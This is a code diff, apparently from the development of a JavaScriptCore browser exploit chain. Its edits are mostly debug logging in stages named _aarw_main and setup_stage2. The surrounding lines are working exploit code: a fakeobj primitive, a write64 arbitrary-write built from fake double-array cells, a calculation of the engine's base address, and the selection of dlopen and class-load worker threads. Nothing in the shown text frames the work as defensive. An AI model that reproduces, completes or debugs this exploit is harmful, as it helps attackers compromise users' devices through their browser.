@@ -17689,15 +17689,7 @@ async function _aarw_main() {
           })();
           print("jsc_base now: " + jsc_base.hex());
           function resolverCheckpoint(message) {
-              const keep = message.startsWith("fallback selected") ||
-                  message.startsWith("device_model:") ||
-                  message.startsWith("slide:") ||
-                  message.indexOf("selected worker=") !== -1 ||
-                  message.startsWith("worker selected=") ||
-                  message.startsWith("worker global offsets") ||
-                  message.startsWith("Finished stage1");
-              if (keep)
-                  print("resolver: " + message);
+              print("resolver: " + message);
               sleep(10);
           }
           resolverCheckpoint("post-jsc-base");
@@ -18367,9 +18359,11 @@ const device_chipset = {
           scribble_element[0] = 1.1;
           print("setup_stage2: reading double_array_cell");
           let double_array_cell = BigInt.fromDouble(change_scribble[0]);
+          print(`setup_stage2: double_array_cell=${double_array_cell.hex()}`);
+          print("setup_stage2: installing fake double array cell");
           change_scribble_holder.p1 = p.fakeobj(double_array_cell);
           const original_cell = change_scribble[0];
-          print("setup_stage2: double array cell installed");
+          print(`setup_stage2: original_cell=${BigInt.fromDouble(original_cell).hex()}`);
           p.write64 = function (addr, value) {
             change_scribble[0] = original_cell;
             change_scribble[1] = (addr + 0x10n).asDouble();
@@ -18736,8 +18730,7 @@ async function main() {
             return -1;
           }
           function workerResolverCheckpoint(message) {
-            if (message.indexOf("found required") !== -1)
-              print("worker resolver: " + message);
+            print("worker resolver: " + message);
             sleep(10);
           }
           for (let i = 0n; i < contexts_length; ++i) {
@@ -18789,7 +18782,6 @@ async function main() {
                 id: id,
                 bitmap: bitmap
               });
-              print(`worker resolver: accepted dlopen id=${id.hex()} worker=${context.hex()} bitmap=${bitmap.hex()}`);
             } else if (classLoadWorkerIndex(id) !== -1) {
               class_load_workers.push({
                 thread: thread,
@@ -18797,7 +18789,6 @@ async function main() {
                 bitmap: bitmap,
                 index: classLoadWorkerIndex(id)
               });
-              print(`worker resolver: accepted class-load index=${classLoadWorkerIndex(id)} id=${id.hex()} worker=${context.hex()} bitmap=${bitmap.hex()}`);
             }
             if (dlopen_workers.length >= 2 && class_load_workers.length >= 3) {
               workerResolverCheckpoint("found required dlopen/class-load workers");
